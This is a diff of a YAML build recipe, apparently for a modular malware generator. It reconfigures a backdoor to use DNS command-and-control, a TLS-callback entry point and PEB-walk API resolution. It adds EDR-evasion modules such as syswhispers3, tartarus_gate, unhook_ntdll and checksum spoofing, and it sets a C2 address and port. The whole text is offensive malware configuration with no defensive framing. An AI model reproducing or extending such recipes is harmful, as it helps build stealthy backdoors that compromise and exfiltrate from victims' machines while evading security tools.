@@ -1,4 +1,4 @@
-name: backdoor_cs_v3
+name: backdoor_cs_dns_v1
 description: Auto-generated recipe by Hermes (c)
 core:
 - core/emit_buffer
@@ -6,13 +6,15 @@ core:
 - core/file_ops
 collectors:
 - core/emit_buffer
-exfil: c2/winhttp_beacon
-arch: arch/backdoor
+exfil: c2/dns_c2
+arch: arch/tls_callback
 resources: true
-api_resolve: api_resolve/api_hash_crc32
+api_resolve: api_resolve/peb_walk
 evasion:
-- evasion/unhook_peruns_fart
-- evasion/etw_patch
+- evasion/syswhispers3
+- evasion/tartarus_gate
+- evasion/unhook_ntdll
+- evasion/checksum_spoof
 vars:
   C2_IP: 10.0.2.2
   C2_PORT: '9001'
